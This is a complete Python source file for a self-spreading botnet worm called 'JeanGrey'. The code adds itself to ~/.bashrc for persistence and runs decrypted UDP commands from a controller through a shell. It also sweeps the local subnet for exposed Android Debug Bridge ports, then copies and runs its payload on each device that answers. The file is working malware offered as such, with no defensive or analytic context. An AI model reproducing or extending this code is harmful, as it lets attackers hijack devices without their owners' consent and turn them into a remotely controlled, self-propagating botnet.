import os
import json
import time
import socket
import subprocess
import threading
from jeangrey_crypto import decrypt

STATE_DIR = "bots"
STATE_FILE = ""
LISTEN_PORT = 5556
ADB_PAYLOAD = "/sdcard/Download/jeangrey_android.py"
ADB_PORT = 5555

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "127.0.0.1"
    finally:
        s.close()

def generate_state():
    global STATE_FILE
    ip = get_ip()
    bot_id = f"bot_{ip.replace('.', '_')}"
    STATE_FILE = f"{STATE_DIR}/{bot_id}/jeangrey_state.json"
    os.makedirs(f"{STATE_DIR}/{bot_id}", exist_ok=True)
    state = {
        "bot_id": bot_id,
        "ip": ip,
        "joined": time.ctime(),
        "last_seen": time.ctime(),
        "tags": ["jeangrey", "android", "mesh", "replicator"]
    }
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=4)

def update_last_seen():
    try:
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
        state["last_seen"] = time.ctime()
        with open(STATE_FILE, "w") as f:
            json.dump(state, f, indent=4)
    except:
        pass

def gain_persistence():
    print("[*] Setting up persistence...")
    bashrc_path = os.path.expanduser("~/.bashrc")
    with open(bashrc_path, "a") as f:
        f.write(f"\npython {ADB_PAYLOAD} &\n")

def listen_for_commands():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", LISTEN_PORT))
    print("[*] JeanGrey listening for encrypted mesh commands...")
    while True:
        data, addr = sock.recvfrom(2048)
        try:
            cmd = decrypt(data.decode())
            print(f"[CMD] From {addr[0]}: {cmd}")
            subprocess.run(cmd, shell=True)
        except Exception as e:
            print(f"[!] Decrypt error: {e}")

def replicate():
    print("[*] Beginning replication loop...")
    while True:
        ip_base = ".".join(get_ip().split(".")[:3])
        for i in range(1, 255):
            target_ip = f"{ip_base}.{i}"
            if target_ip == get_ip():
                continue
            try:
                result = subprocess.run(["adb", "connect", f"{target_ip}:{ADB_PORT}"], capture_output=True, text=True)
                if "connected" in result.stdout.lower():
                    subprocess.run(["adb", "push", ADB_PAYLOAD, "/sdcard/Download/jeangrey_android.py"], capture_output=True)
                    subprocess.run(["adb", "shell", "python /sdcard/Download/jeangrey_android.py"], capture_output=True)
                    print(f"[+] Replicated to {target_ip}")
            except:
                pass
        time.sleep(300)

def heartbeat_loop():
    while True:
        update_last_seen()
        time.sleep(60)

def main():
    generate_state()
    gain_persistence()
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=replicate, daemon=True).start()
    listen_for_commands()

if __name__ == "__main__":
    main()
